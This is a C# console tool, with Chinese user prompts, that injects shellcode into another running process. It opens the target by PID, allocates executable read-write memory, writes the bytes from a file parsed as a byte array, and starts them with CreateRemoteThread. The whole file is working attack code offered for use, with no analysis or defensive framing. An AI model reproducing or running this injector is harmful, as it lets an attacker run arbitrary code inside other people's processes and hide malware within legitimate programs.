using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Injection;

internal class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;


    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        Console.WriteLine("进程PID：");
        string? pidStr = Console.ReadLine();
        if (!int.TryParse(pidStr, out var pid))
        {
            Console.WriteLine("进程PID不合法");
            return;
        }

        Console.WriteLine("注入Shellcode(x64)绝对路径：");
        string? shellcodeFullName = Console.ReadLine();
        Inject(shellcodeFullName, pid);


        Console.ReadLine();
    }

    /// <summary>
    /// Injects shellcode into the target process using CreateRemoteThread, using the correct version for the process's architecture.
    /// </summary>
    /// <param name="shellcodeFullName">Shellcode file full name.</param>
    /// <param name="procPID">The PID of the target process.</param>
    /// <returns></returns>
    public static int Inject(string shellcodeFullName, int procPID)
    {

        Process targetProcess = Process.GetProcessById(procPID);
        Console.WriteLine(targetProcess.Id);


        byte[] shellcode = /*Convert.FromBase64String(s)*/ReadLoaderCs(shellcodeFullName);

        if (Inject(shellcode, procPID) != IntPtr.Zero)
            Console.WriteLine("[!] Successfully injected into {0} ({1})!", targetProcess.ProcessName, procPID);
        else
            Console.WriteLine("[!] Failed to inject!");

        return 0;
    }

    /// <summary>
    /// Injects raw shellcode into the target process using CreateRemoteThread.
    /// </summary>
    /// <param name="shellcode">The shellcode to inject.</param>
    /// <param name="procPID">The PID of the target process.</param>
    /// <returns></returns>
    public static IntPtr Inject(byte[] shellcode, int procPID)
    {
        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, procPID);

        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        UIntPtr bytesWritten;
        WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);

        return CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);

    }

    private static byte[] ReadLoaderCs(string shellcodeFullName)
    {
        var result = new List<byte>();

        var content = File.ReadAllText(shellcodeFullName);
        var sb = new StringBuilder();
        bool enable = false;
        foreach (var c in content)
        {
            if (c == '{')
            {
                enable = true;
                continue;
            }
            if (c == '}')
            {
                enable = false;
                break;
            }
            if (c == '\n' || c == '\t' || c == ' ') continue;
            if (c == ',')
            {
                result.Add(byte.Parse(sb.ToString()));
                sb.Clear();
                continue;
            }
            if (enable) sb.Append(c);
        }

        return result.ToArray();
    }
}
